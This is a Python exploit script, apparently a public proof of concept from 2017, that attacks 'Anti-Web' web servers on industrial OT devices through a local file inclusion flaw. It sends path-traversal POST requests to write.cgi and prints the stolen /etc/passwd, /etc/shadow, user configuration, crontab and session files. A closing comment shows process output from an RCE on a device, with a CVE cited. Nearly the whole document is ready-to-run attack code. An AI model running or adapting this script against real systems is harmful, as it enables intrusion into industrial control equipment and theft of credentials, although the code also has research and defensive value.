# -*- coding: utf-8 -*- 
import requests
import sys

banner = '''

		|=--------------------------------------------------------------------=|
		|=---------=[ Server: "Anti-Web 3.0.x < 3.8.x" LFI Exploit ]=---------=|
		|=--------------------------=[ 15 may 2017 ]=-------------------------=|
		|=-------------------------=[  Researcher:  ]=------------------------=|
		|=---------------=[ Bertin Jose && Fernandez Ezequiel ]=--------------=|
		|=--------------------------------------------------------------------=|

'''

details = ''' 
 # Exploit Title: Apps industrial OT over Server: "Anti-Web 3.0.x < 3.8.x" Local File Inclusion
 # Date: 15/05/2017
 # Exploit Author: Bertin Jose ( @bertinjoseb ) && Fernandez Ezequiel ( @capitan_alfa )
 # Vendor: Multiples vendors
 # Category: Industrial OT webapps

'''

dm 		= sys.argv[1]
port 	= sys.argv[2]

headers = {}

class Colors:
    BLUE 		= '\033[94m'
    GREEN 		= '\033[32m'
    RED 		= '\033[0;31m'
    DEFAULT		= '\033[0m'
    ORANGE 		= '\033[33m'
    WHITE 		= '\033[97m'
    BOLD 		= '\033[1m'
    BR_COLOUR 	= '\033[1;37;40m'


uriPath = "/cgi-bin/write.cgi"
host =  "http://"+dm+":"+port+uriPath

#xfile 	= "etc/config/system.conf"
xfile 	= "etc/passwd"

LFI 	= "../../../../../../"+str(xfile)

lenLFI = int(len(LFI))
ContLen = str(16+lenLFI)

headers["Host"] 			=  dm
headers["User-Agent"]		= "Mozilla/5.0 (X11; Linux x86_64; rv:43.0)"
headers["Accept"] 			= "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
headers["Content-Length"]	=  ContLen
headers["Accept-Languag"] 	= "es-AR,en-US;q=0.7,en;q=0.3"
headers["Referer"] 			=  host
headers["Connection"] 		= "close"
headers["Content-Type"] 	= "application/x-www-form-urlencoded"

print Colors.GREEN+banner
print Colors.BLUE+details


print Colors.GREEN+" [*] HOST:\t"+Colors.ORANGE+host
print Colors.GREEN+" [*] POST:\t"+Colors.BLUE+"page=/&template=<"+Colors.RED+" LFI "+Colors.BLUE+">"

# POC 0: get_file: /etc/passwd 
thePost0 = "page=/&template="+LFI
r0 = requests.post(host, data=thePost0,headers=headers)

# ---------------------------------------------------------------------
# POC 1: get_file: /etc/shadow 
thePost1 = "page=/&template=../../../../../../etc/shadow"
r1 = requests.post(host, data=thePost1,headers=headers)
# ---------------------------------------------------------------------

# POC 2: get_file: /etc/config/system.conf
thePost2 = "page=/&template=../../../../../../etc/config/system.conf"
r2 = requests.post(host, data=thePost2,headers=headers)
# ---------------------------------------------------------

# POC 3: get_file: etc/config/system.conf
thePost3 = "page=/&template=../../../../../../etc/version"
r3 = requests.post(host, data=thePost3,headers=headers)
# ---------------------------------------------------------

# POC 4: get_file: /etc/config/crontab
thePost4 = "page=/&template=../../../../../../etc/config/crontab"
r4 = requests.post(host, data=thePost4, headers=headers)
# ---------------------------------------------------------

# POC 5: get_file: /home/config/users.cfg
thePost5 = "page=/&template=../../../../../../home/config/users.cfg"
r5 = requests.post(host, data=thePost5, headers=headers)
# ---------------------------------------------------------
# POC 5: get_file: /var/sessions.conf
thePost6 = "page=/&template=../../../../../../var/sessions.conf"
r6 = requests.post(host, data=thePost6, headers=headers)
# ---------------------------------------------------------


print "\n"
x0_Output = r0.text

x1_Output = r1.text

x2_Output = r2.text

x3_Output = r3.text

x4_Output = r4.text

x5_Output = r5.text

x6_Output = r6.text


print Colors.GREEN+" |=--------------------------=[  OUTPUT - POC ]=-------------------------=|\n" 

print Colors.GREEN+" [+] /etc/passwd"
print Colors.ORANGE+"\r"+x0_Output

print Colors.GREEN+" [+] /etc/shadow"
print Colors.ORANGE+"\r"+x1_Output

print Colors.GREEN+"\n [+] /etc/config/system.conf"
print Colors.ORANGE+"\r"+x2_Output+Colors.DEFAULT+Colors.DEFAULT

print Colors.GREEN+"\n [+] /etc/version (Kernel version)"
print Colors.ORANGE+"\r"+x3_Output+Colors.DEFAULT+Colors.DEFAULT

print Colors.GREEN+"\n [+] /etc/config/crontab"
print Colors.ORANGE+"\r"+x4_Output+Colors.DEFAULT+Colors.DEFAULT


print Colors.GREEN+"\n [+] home/config/users.cfg"
print Colors.ORANGE+"\r"+x5_Output+Colors.DEFAULT+Colors.DEFAULT


print Colors.GREEN+"\n [+] /var/sessions.conf"
print Colors.ORANGE+"\r"+x6_Output+Colors.DEFAULT+Colors.DEFAULT





'''

https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9097
first rce (CVE-2017-9097):
		#> ps aux 
		  PID  Uid     VmSize Stat Command
		    1 root            SW  init 
		    2 root            SW  [keventd]
		    3 root            RWN [ksoftirqd_CPU0]
		    4 root            SW  [kswapd]
		    5 root            SW  [bdflush]
		    6 root            SW  [kupdated]
		    7 root            SW  [mtdblockd]
		   21 root            SW  /bin/syslogd -n              
		   27 root            SWN [jffs2_gcd_mtd4]
		   78 root            SW  /bin/hicpd 
		  108 root            SW  wda 
		  120 root            SW  rtu_mast -d 3 
		  129 root            SW  commgr 
		  145 root            SW  tsmgr -d 4 
		  162 root            SW  cron -d 3 
		  171 root            SW  dscopy -d 3 
		  180 root            SW  eventmgr -d 3 
		  205 root            SW  /bin/inetd 
		  206 root            SW  /bin/sh /var/start_ntp 
		  207 root            SW  /usr/bin/awhttpd /etc/config/awhttpd.conf 
		  208 root            SW  msntp -r -P no -x 120 pool.ntp.org 
		 1047 root            SW  /home/httpd/cgi-bin/read.cgi 
		 1065 root            SW  /home/httpd/cgi-bin/read.cgi 
		 1066 root            SW  /home/httpd/cgi-bin/read.cgi 
		 1245 root            SW  /home/httpd/cgi-bin/read.cgi 
		 1280 root            SW  /home/httpd/cgi-bin/read.cgi 
		 1359 root            SW  /home/httpd/cgi-bin/read.cgi 
		 1690 root            SW  /home/httpd/cgi-bin/read.cgi 
		 1969 root            SW  /home/httpd/cgi-bin/read.cgi 
		10527 root            SW  /home/httpd/cgi-bin/write.cgi 
	'''